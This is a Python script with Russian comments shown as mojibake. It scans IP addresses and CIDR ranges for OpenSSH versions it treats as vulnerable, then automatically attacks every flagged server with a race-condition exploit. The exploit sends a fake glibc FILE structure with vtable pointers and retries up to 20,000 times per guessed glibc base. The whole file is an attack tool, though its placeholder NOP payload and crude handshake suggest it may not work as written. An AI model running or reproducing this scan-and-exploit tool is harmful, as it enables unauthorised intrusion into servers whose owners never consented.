import socket
import struct
import argparse
import ipaddress
import threading
from queue import Queue
import time

# –∞–¥—Ä–µ—Å–∞ –ø–∞–º—è—Ç–∏ glibc –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏
POSSIBLE_GLIBC_BASES = [0xb7200000, 0xb7400000]

# –®–µ–ª–ª–∫–æ–¥ –¥–ª—è –∏–Ω—ä–µ–∫—Ü–∏–∏
EXPLOIT_PAYLOAD = b"\x90\x90\x90\x90"
MAX_EXPLOIT_ATTEMPTS = 20000
DELAY_BETWEEN_ATTEMPTS = 0.1  # 100ms
MAX_BUFFER_SIZE = 1024

# –°–æ–∑–¥–∞–Ω–∏–µ TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º IP-–∞–¥—Ä–µ—Å–æ–º –∏ –ø–æ—Ä—Ç–æ–º
def create_tcp_connection(target_ip, target_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.setblocking(0)
    client_socket.connect_ex((target_ip, target_port))
    return client_socket

# –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–∫–µ—Ç–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —Ç–∏–ø–∞ –∏ —Å–æ–¥–µ—Ä–∂–∞–Ω–∏—è
def transmit_packet(client_socket, packet_type, content):
    packet_length = len(content) + 5
    packet = struct.pack('>I', packet_length) + struct.pack('B', packet_type) + content
    client_socket.sendall(packet)

# –û—Ç–ø—Ä–∞–≤–∫–∞ –≤–µ—Ä—Å–∏–∏ SSH –∫–ª–∏–µ–Ω—Ç–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
def initiate_ssh_protocol(client_socket):
    ssh_version_message = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    client_socket.sendall(ssh_version_message)

# –ü–æ–ª—É—á–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–∏ SSH —Å–µ—Ä–≤–µ—Ä–∞
def receive_server_ssh_version(client_socket):
    while True:
        try:
            server_response = client_socket.recv(256)
            if server_response:
                print(f"–ü–æ–ª—É—á–µ–Ω–∞ –≤–µ—Ä—Å–∏—è SSH —Å–µ—Ä–≤–µ—Ä–∞: {server_response.decode()}")
                break
        except BlockingIOError:
            time.sleep(0.1)

# –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –ø–∞–∫–µ—Ç–∞ –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –æ–±–º–µ–Ω–∞ –∫–ª—é—á–∞–º–∏
def send_kexinit_packet(client_socket):
    kexinit_data = b"\x00" * 36
    transmit_packet(client_socket, 20, kexinit_data)

# –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞–∫–µ—Ç–∞ KEX_INIT –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞
def receive_kexinit_packet(client_socket):
    while True:
        try:
            response = client_socket.recv(MAX_BUFFER_SIZE)
            if response:
                print(f"–ü–æ–ª—É—á–µ–Ω –ø–∞–∫–µ—Ç KEX_INIT ({len(response)} –±–∞–π—Ç)")
                break
        except BlockingIOError:
            time.sleep(0.1)

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –æ–±–º–µ–Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏ –¥–ª—è SSH —Ä—É–∫–æ–ø–æ–∂–∞—Ç–∏—è
def execute_ssh_handshake(client_socket):
    initiate_ssh_protocol(client_socket)
    receive_server_ssh_version(client_socket)
    send_kexinit_packet(client_socket)
    receive_kexinit_packet(client_socket)

# –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–¥–¥–µ–ª—å–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Ñ–∞–π–ª–∞ –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
def construct_fake_file_structure(buffer, glibc_base_addr):
    fake_file_data = struct.pack('<QQQQQQQQQQQQQQQ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x61)
    vtable_ptr = struct.pack('<Q', glibc_base_addr + 0x21b740)
    codecvt_ptr = struct.pack('<Q', glibc_base_addr + 0x21d7f8)
    buffer[:len(fake_file_data)] = fake_file_data
    buffer[-16:] = vtable_ptr + codecvt_ptr

# –ü–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å –ø–æ–º–æ—â—å—é —É—Å–ª–æ–≤–∏—è –≥–æ–Ω–∫–∏
def exploit_race_condition(client_socket, processing_delay, glibc_base_addr):
    malicious_packet = bytearray(MAX_BUFFER_SIZE)
    construct_fake_file_structure(malicious_packet, glibc_base_addr)
    malicious_packet[:len(EXPLOIT_PAYLOAD)] = EXPLOIT_PAYLOAD
    client_socket.sendall(malicious_packet[:-1])
    time.sleep(processing_delay - 0.001)
    client_socket.sendall(malicious_packet[-1:])
    try:
        server_response = client_socket.recv(MAX_BUFFER_SIZE)
        if server_response:
            print(f"–ü–æ–ª—É—á–µ–Ω –æ—Ç–≤–µ—Ç –ø–æ—Å–ª–µ –ø–æ–ø—ã—Ç–∫–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ ({len(server_response)} –±–∞–π—Ç)")
            return True
    except BlockingIOError:
        return False
    return False

# —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–π —Ü–µ–ª–∏
def initiate_exploit(target_ip, target_port):
    exploit_success = False
    for glibc_base in POSSIBLE_GLIBC_BASES:
        print(f"–ü—ã—Ç–∞–µ–º—Å—è –ø—Ä–æ–≤–µ—Å—Ç–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é —Å –±–∞–∑–æ–π glibc: 0x{glibc_base:x}")
        for attempt in range(MAX_EXPLOIT_ATTEMPTS):
            if attempt % 1000 == 0:
                print(f"–ü–æ–ø—ã—Ç–∫–∞ {attempt} –∏–∑ {MAX_EXPLOIT_ATTEMPTS}")
            try:
                client_socket = create_tcp_connection(target_ip, target_port)
                execute_ssh_handshake(client_socket)
                processing_delay = 0.5
                if exploit_race_condition(client_socket, processing_delay, glibc_base):
                    print(f"–í–æ–∑–º–æ–∂–Ω—ã–π —É—Å–ø–µ—Ö —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –Ω–∞ –ø–æ–ø—ã—Ç–∫–µ {attempt} —Å –±–∞–∑–æ–π glibc 0x{glibc_base:x}!")
                    exploit_success = True
                    break
            except Exception as error:
                print(f"–û—à–∏–±–∫–∞ –Ω–∞ –ø–æ–ø—ã—Ç–∫–µ {attempt}: {error}")
            finally:
                client_socket.close()
                time.sleep(DELAY_BETWEEN_ATTEMPTS)
        if exploit_success:
            break
    return exploit_success

# –°–æ–∑–¥–∞–Ω–∏–µ SSH-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –∏ –≤–æ–∑–≤—Ä–∞—Ç —Å–æ–∫–µ—Ç–∞
def retrieve_ssh_connection(target_ip, target_port, timeout_duration):
    ssh_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssh_socket.settimeout(timeout_duration)
    try:
        ssh_socket.connect((target_ip, target_port))
        return ssh_socket
    except:
        return None

# –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–Ω–Ω–µ—Ä–∞ SSH —Å–µ—Ä–≤–µ—Ä–∞
def fetch_ssh_banner(ssh_socket):
    try:
        banner_info = ssh_socket.recv(MAX_BUFFER_SIZE).decode().strip()
        ssh_socket.close()
        return banner_info
    except Exception as error:
        return str(error)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–µ—Ä–≤–µ—Ä–∞ –ø–æ –≤–µ—Ä—Å–∏–∏ SSH
def validate_vulnerability(target_ip, target_port, timeout_duration, result_queue):
    ssh_socket = retrieve_ssh_connection(target_ip, target_port, timeout_duration)
    if not ssh_socket:
        result_queue.put((target_ip, target_port, 'closed', "–ü–æ—Ä—Ç –∑–∞–∫—Ä—ã—Ç"))
        return

    banner = fetch_ssh_banner(ssh_socket)
    if "SSH-2.0-OpenSSH" not in banner:
        result_queue.put((target_ip, target_port, 'failed', f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –±–∞–Ω–Ω–µ—Ä SSH: {banner}"))
        return

    vulnerable_ssh_versions = [
        'SSH-2.0-OpenSSH_8.5',
        'SSH-2.0-OpenSSH_8.6',
        'SSH-2.0-OpenSSH_8.7',
        'SSH-2.0-OpenSSH_8.8',
        'SSH-2.0-OpenSSH_8.9',
        'SSH-2.0-OpenSSH_9.0',
        'SSH-2.0-OpenSSH_9.1',
        'SSH-2.0-OpenSSH_9.2',
        'SSH-2.0-OpenSSH_9.3',
        'SSH-2.0-OpenSSH_9.4',
        'SSH-2.0-OpenSSH_9.5',
        'SSH-2.0-OpenSSH_9.6',
        'SSH-2.0-OpenSSH_9.7'
    ]

    excluded_versions = [
        'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10',
        'SSH-2.0-OpenSSH_9.3p1 Ubuntu-3ubuntu3.6',
        'SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.3',
        'SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3',
        'SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3'
    ]

    if any(version in banner for version in vulnerable_ssh_versions) and banner not in excluded_versions:
        result_queue.put((target_ip, target_port, 'vulnerable', f"(–∑–∞–ø—É—â–µ–Ω {banner})"))
    else:
        result_queue.put((target_ip, target_port, 'not_vulnerable', f"(–∑–∞–ø—É—â–µ–Ω {banner})"))

# –ß—Ç–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–æ–≤ –∏–∑ —Ñ–∞–π–ª–∞.
def process_ip_targets(ip_list_filepath):
    ip_addresses = []
    try:
        with open(ip_list_filepath, 'r') as ip_file:
            ip_addresses.extend(ip_file.readlines())
    except IOError:
        print(f"‚ùå [-] –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª: {ip_list_filepath}")
    return [ip.strip() for ip in ip_addresses]

def main():
    parser = argparse.ArgumentParser(description="–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ä–≤–µ—Ä–æ–≤ –Ω–∞ —É—è–∑–≤–∏–º—ã–µ –≤–µ—Ä—Å–∏–∏ OpenSSH –∏ –ø–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏.")
    parser.add_argument("targets", nargs='*', help="IP-–∞–¥—Ä–µ—Å–∞, –¥–æ–º–µ–Ω–Ω—ã–µ –∏–º–µ–Ω–∞, —Ñ–∞–π–ª—ã —Å IP-–∞–¥—Ä–µ—Å–∞–º–∏ –∏–ª–∏ CIDR-–¥–∏–∞–ø–∞–∑–æ–Ω—ã.")
    parser.add_argument("--port", type=int, default=22, help="–ù–æ–º–µ—Ä –ø–æ—Ä—Ç–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: 22).")
    parser.add_argument("-t", "--timeout", type=float, default=1.0, help="–¢–∞–π–º–∞—É—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: 1 —Å–µ–∫—É–Ω–¥–∞).")
    parser.add_argument("-l", "--list", help="–§–∞–π–ª —Å–æ —Å–ø–∏—Å–∫–æ–º IP-–∞–¥—Ä–µ—Å–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏.")

    args = parser.parse_args()
    targets = args.targets
    port = args.port
    timeout = args.timeout

    ip_list = []

    if args.list:
        ip_list.extend(process_ip_targets(args.list))

    for target in targets:
        try:
            with open(target, 'r') as ip_file:
                ip_list.extend(ip_file.readlines())
        except IOError:
            if '/' in target:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    ip_list.extend([str(ip) for ip in network.hosts()])
                except ValueError:
                    print(f"‚ùå [-] –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è CIDR –Ω–æ—Ç–∞—Ü–∏—è: {target}")
            else:
                ip_list.append(target)
    
    result_queue = Queue()
    threads = []

    # –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–µ—Ä–≤–µ—Ä–æ–≤
    for ip in ip_list:
        ip = ip.strip()
        thread = threading.Thread(target=validate_vulnerability, args=(ip, port, timeout, result_queue))
        thread.start()
        threads.append(thread)

    # –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–æ–≤
    for thread in threads:
        thread.join()

    total_scanned = len(ip_list)
    closed_ports_count = 0
    non_vulnerable_servers = []
    vulnerable_servers = []

    # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    while not result_queue.empty():
        ip, port, status, message = result_queue.get()
        if status == 'closed':
            closed_ports_count += 1
        elif status == 'vulnerable':
            vulnerable_servers.append((ip, message))
        elif status == 'not_vulnerable':
            non_vulnerable_servers.append((ip, message))
        else:
            print(f"‚ö†Ô∏è [!] –°–µ—Ä–≤–µ—Ä –Ω–∞ {ip}:{port} - {message}")

    print(f"\nüõ°Ô∏è –°–µ—Ä–≤–µ—Ä–æ–≤ –Ω–µ —É—è–∑–≤–∏–º—ã: {len(non_vulnerable_servers)}\n")
    for ip, msg in non_vulnerable_servers:
        print(f"   [+] –°–µ—Ä–≤–µ—Ä –Ω–∞ {ip} {msg}")
    print(f"\nüö® –°–µ—Ä–≤–µ—Ä–æ–≤ –≤–µ—Ä–æ—è—Ç–Ω–æ —É—è–∑–≤–∏–º—ã: {len(vulnerable_servers)}\n")
    for ip, msg in vulnerable_servers:
        print(f"   [+] –°–µ—Ä–≤–µ—Ä –Ω–∞ {ip} {msg}")
    print(f"\nüîí –°–µ—Ä–≤–µ—Ä–æ–≤ —Å –∑–∞–∫—Ä—ã—Ç—ã–º –ø–æ—Ä—Ç–æ–º {port}: {closed_ports_count}")
    print(f"\nüìä –í—Å–µ–≥–æ –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ —Ü–µ–ª–µ–π: {total_scanned}\n")
    print("\n\n–ù–∞—á–∏–Ω–∞–µ–º —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é...\n")
    for ip, _ in vulnerable_servers:
        success = initiate_exploit(ip, port)
        if success:
            print(f"\n[!] –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ {ip} –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!\n")
        else:
            print(f"\n[!] –ü–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ {ip} –Ω–µ —É–¥–∞–ª–∞—Å—å\n")

if __name__ == "__main__":
    main()
